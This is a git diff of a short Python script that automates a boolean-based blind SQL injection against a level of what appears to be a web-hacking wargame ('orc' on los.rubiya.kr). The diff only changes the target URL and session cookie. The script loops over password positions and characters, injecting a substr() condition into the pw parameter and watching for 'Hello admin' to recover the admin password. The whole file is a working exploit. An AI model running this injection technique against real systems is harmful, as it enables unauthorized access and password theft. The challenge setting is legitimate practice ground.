@@ -1,4 +1,4 @@
-# python 3.6.4
+# python 3.6.5
 import urllib.request
 import urllib.parse
 MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
@@ -13,21 +13,19 @@ pw=""
 arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
 for i in range(1,9):
 	for j in range(0,62):
-		url="http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=*'%20||%20id='admin'%20and%20substr(pw,{0},1)='{ascii}'%23".format(i,ascii=arr[j])
+		url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=*'%20||%20id='admin'%20and%20substr(pw,{0},1)='{ascii}'%23".format(i,ascii=arr[j])
 		print("1")
 		print(url)
 		r = urllib.request.Request(url)
 		print("2")
-		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
+		r.add_header("Cookie","PHPSESSID=9bcrphabh03redvupi1pci5ml2")
 		print("3")
 		data = urllib.request.urlopen(r)
 		print("4")
 		asdf = data.read().decode('utf-8')
+		# print(asdf)
 		if asdf.find("Hello admin") != -1 :
 			pw = pw + arr[j]
 			print("This is    "+arr[j])
 			break
 print(pw)
-
-
-
